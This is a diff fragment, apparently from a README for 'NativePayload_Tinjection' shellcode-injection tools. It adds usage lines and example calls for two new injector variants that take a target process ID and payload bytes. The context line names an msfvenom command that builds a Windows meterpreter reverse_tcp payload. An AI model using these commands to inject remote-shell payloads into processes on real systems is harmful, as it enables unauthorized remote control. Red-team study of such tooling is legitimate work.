@@ -17,11 +17,19 @@ msfvenom –platform windows –arch x86_64 -p windows/x64/meterpreter/reverse_t
     Code1: NativePayload_Tinjection.exe [TPID] [PAYLOAD]
 
     Code2: NativePayload_Tinjectionx.exe [TPID] [PAYLOAD]
+    
+    Code3: NativePayload_Tinjection2.exe [TPID] [PAYLOAD]
+    
+    Code4: NativePayload_Tinjection2nt.exe [TPID] [PAYLOAD]
 
 
     EXAMPLE: NativePayload_Tinjection.exe 2452 "FC,48,83,00,..."
 
     EXAMPLE: NativePayload_Tinjectionx.exe 2452 "FC,48,83,00,..."
+    
+    EXAMPLE: NativePayload_Tinjection2.exe 2452 "FC,48,83,00,..."
+    
+    EXAMPLE: NativePayload_Tinjection2nt.exe 2452 "FC,48,83,00,..."
     
 ------------------------------------------------
 
